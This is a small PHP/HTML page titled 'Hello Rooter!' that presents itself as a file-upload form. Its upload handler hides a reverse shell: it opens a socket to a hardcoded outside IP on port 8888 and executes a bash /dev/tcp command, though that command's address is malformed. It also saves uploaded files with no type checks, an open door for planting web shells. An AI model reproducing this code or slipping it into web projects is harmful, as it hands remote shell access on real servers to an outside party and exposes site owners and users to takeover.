<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello Rooter</title>
</head>
<body>

    <h1>Hello Rooter!</h1>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['upload'])) {
        // File upload logic
        header("Content-Type: text/html");

// Extract the listener's IP address and port number from the webpage
$listener_ip = '62.171.160.234'; // Replace with the extracted IP address
$listener_port = '8888'; // Replace with the extracted port number

// Create a reverse shell connection to the listener
$sock = fsockopen($listener_ip, $listener_port);

// Execute the command
exec("bash -c 'exec bash -i &>/dev/tcp// <&1' ");
        $targetDirectory = "uploads/";
        $targetFile = $targetDirectory . basename($_FILES["file"]["name"]);

        // Validate file type if needed
        $fileType = pathinfo($targetFile, PATHINFO_EXTENSION);
        // You can add more validation checks based on your requirements

        if (move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile)) {
            echo "<p>File uploaded successfully: " . htmlspecialchars(basename($_FILES["file"]["name"])) . "</p>";
            echo "<p>File location: " . realpath($targetFile) . "</p>";
        } else {
            echo "<p>Sorry, there was an error uploading your file.</p>";
        }
    }
    ?>

    <form action="" method="post" enctype="multipart/form-data">
        <label for="file">Choose a file:</label>
        <input type="file" name="file" id="file">
        <button type="submit" name="upload">Upload</button>
    </form>

</body>
</html>
